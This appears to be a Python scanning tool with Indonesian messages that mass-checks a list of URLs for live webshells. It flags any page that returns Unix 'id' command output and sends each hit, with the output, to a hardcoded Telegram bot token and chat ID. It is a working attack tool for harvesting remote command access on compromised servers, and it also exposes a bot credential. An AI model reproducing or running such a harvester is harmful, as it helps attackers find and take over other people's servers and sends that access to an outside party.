import subprocess
import sys

# Auto install module jika belum ada
for module in ['requests', 'urllib3', 'colorama']:
    try:
        __import__(module)
    except ImportError:
        print(f"[INFO] Menginstal modul: {module}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])

import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import threading
import time
from colorama import Fore, Style, init

# Aktifkan colorama (untuk Windows)
init(autoreset=True)

urllib3.disable_warnings()
lock = threading.Lock()

# === SETUP BOT TELEGRAM ===
TELEGRAM_BOT_TOKEN = '7838575827:AAHby4OtPYb4bslLK9DC8ovFtd9T-KhkR9M'
TELEGRAM_CHAT_ID = '7247720663'

def escape_markdown(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join('\\' + c if c in escape_chars else c for c in text)

def kirim_telegram(pesan):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': pesan,
        'parse_mode': 'MarkdownV2'
    }
    try:
        res = requests.post(url, data=payload)
        if res.status_code != 200:
            print(f"[TELEGRAM ERROR] {res.status_code} - {res.text}")
    except Exception as e:
        print(f"[TELEGRAM EXCEPTION] {e}")

session = requests.Session()

def cek_webshell(full_url):
    try:
        response = session.get(full_url, timeout=1, verify=False)
        time.sleep(0.1)

        if response.status_code == 200 and 'uid=' in response.text:
            output = response.text.strip().replace("\n", " ")

            if re.search(r'uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)\s+groups=\d+\([^)]+\)', output):
                result = f"{Fore.GREEN}[VULN] {full_url} → {output}{Style.RESET_ALL}"
                print(result)
                with lock:
                    with open("vuln.txt", "a", encoding="utf-8") as f:
                        f.write(result + "\n")

                escaped_url = escape_markdown(full_url)
                escaped_text = escape_markdown(response.text.strip())
                telegram_msg = (
                    "🚨 *VULNERABILITY FOUND* 🚨\n"
                    f"{escaped_url} → ```{escaped_text}```"
                )
                kirim_telegram(telegram_msg)
            else:
                print(f"{Fore.RED}[FAKE] {full_url} → Output tidak valid.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[SAFE] {full_url}{Style.RESET_ALL}")
    except requests.RequestException as e:
        print(f"{Fore.RED}[ERROR] {full_url} - {e}{Style.RESET_ALL}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python scan_webshell.py <file_list> [thread_count]")
        return

    input_file = sys.argv[1]
    thread_count = int(sys.argv[2]) if len(sys.argv) >= 3 else 15

    try:
        with open(input_file, "r", encoding="utf-8") as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] File '{input_file}' tidak ditemukan.{Style.RESET_ALL}")
        return

    print(f"[INFO] Memulai scan terhadap {len(urls)} URL dari {input_file} dengan {thread_count} thread...\n")

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(cek_webshell, url) for url in urls]
        for _ in as_completed(futures):
            pass

if __name__ == "__main__":
    main()
